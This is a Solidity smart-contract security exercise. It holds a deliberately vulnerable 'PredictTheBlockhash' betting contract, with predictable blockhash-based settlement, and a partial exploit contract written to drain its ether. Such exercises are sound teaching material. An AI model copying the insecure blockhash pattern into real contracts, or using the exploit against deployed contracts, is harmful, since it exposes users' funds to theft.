// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/console.sol";
//Challenge
contract PredictTheBlockhash {
    address guesser;
    bytes32 guess;
    uint256 settlementBlockNumber;

    constructor() payable {
        require(
            msg.value == 1 ether,
            "Requires 1 ether to create this contract"
        );
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function lockInGuess(bytes32 hash) public payable {
        require(guesser == address(0), "Requires guesser to be zero address");
        require(msg.value == 1 ether, "Requires msg.value to be 1 ether");

        guesser = msg.sender;
        guess = hash;
        settlementBlockNumber = block.number + 1;
    }

    function settle() public {
        require(msg.sender == guesser, "Requires msg.sender to be guesser");
        require(
            block.number > settlementBlockNumber,
            "Requires block.number to be more than settlementBlockNumber"
        );

        bytes32 answer = blockhash(settlementBlockNumber);
        console.log(uint256(answer));

        guesser = address(0);
        if (guess == answer) {
            (bool ok, ) = msg.sender.call{value: address(this).balance}("");
            require(ok, "Transfer to msg.sender failed");
        }
    }
}

// Write your exploit contract below
contract ExploitContract {
    PredictTheBlockhash public predictTheBlockhash;
    bytes32 predictHash;

    constructor(PredictTheBlockhash _predictTheBlockhash) {
        predictTheBlockhash = _predictTheBlockhash;
    }

    function setHash(bytes32 _hash) public {
        predictHash = _hash;
    }
    function lockIn() public payable {
        predictTheBlockhash.lockInGuess{value: msg.value}(predictHash);
    }

    function settle() public {
        predictTheBlockhash.settle();
    }

    fallback() external payable {
        
    }

}
